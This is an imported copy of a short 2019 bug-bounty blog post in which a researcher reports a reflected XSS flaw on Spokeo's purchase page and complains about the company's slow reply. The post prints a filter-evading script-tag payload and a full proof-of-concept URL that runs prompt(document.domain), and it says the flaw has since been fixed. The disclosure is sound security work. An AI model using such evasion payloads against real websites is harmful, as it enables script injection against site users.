---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-04-10_spokeo-bug-bounty-experience.md
original_filename: 2019-04-10_spokeo-bug-bounty-experience.md
title: Spokeo Bug bounty Experience
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: f68ac69eff585c05858bb861564e950b182944f05a4ba451f715f26776b4f790
text_sha256: e3aa9069b6fa8b335b595c3dd60a5127171b06cc49467e34ed9a65a6fb06fa01
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Spokeo Bug bounty Experience

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-04-10_spokeo-bug-bounty-experience.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `f68ac69eff585c05858bb861564e950b182944f05a4ba451f715f26776b4f790`
- Text SHA256: `e3aa9069b6fa8b335b595c3dd60a5127171b06cc49467e34ed9a65a6fb06fa01`


## Content

---
title: "Spokeo Bug bounty Experience"
url: "https://medium.com/@nuraalamdipu/spokeo-bug-bounty-experience-3f5caba52416"
authors: ["Nur A Alam Dipu (@Dipu1A)"]
programs: ["Spokeo"]
bugs: ["XSS"]
publication_date: "2019-04-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5318
scraped_via: "browseros"
---

# Spokeo Bug bounty Experience

Spokeo Bug bounty Experience
Nur A Alam Dipu
Follow
1 min read
·
Apr 10, 2019

62

2

Recently I reported a XSS bug at spokeo bug bounty program.

I don’t want to blame the company, sometimes we face like this.

Program : https://www.spokeo.com/security

XSS Playload:
“‘ — !></Script%0C><Script%0C>confirm(1)</Script/%0C>#

Endpoint : All purchase type -> “/purchase?addr_num=6&q=6+130th+Ave+SE,+Bellevue,+WA+98005'&type=inject” parameter

XSS POC:

— — — —-
https://www.spokeo.com/purchase?addr_num=6&q=6+130th+Ave+SE,+Bellevue,+WA+98005'&type=address""'--!></Script%0C><Script%0C>prompt(document.domain)</Script/%0C>&url=/WA/Bellevue/6-130th-Ave-SE'

Get Nur A Alam Dipu’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

PoC:

Press enter or click to view image in full size

After reported I was waiting and checking regularly is that fix or any reply. But no response. After 9 days I checked the xss been fixed. Then again message them, the issue has been fixed. Then they reply :(

Reply:

Press enter or click to view image in full size

Shocking response!

Question is,

Why you response after fix and 9 days later?

:(

Thanks for reading.

Happy hunting!
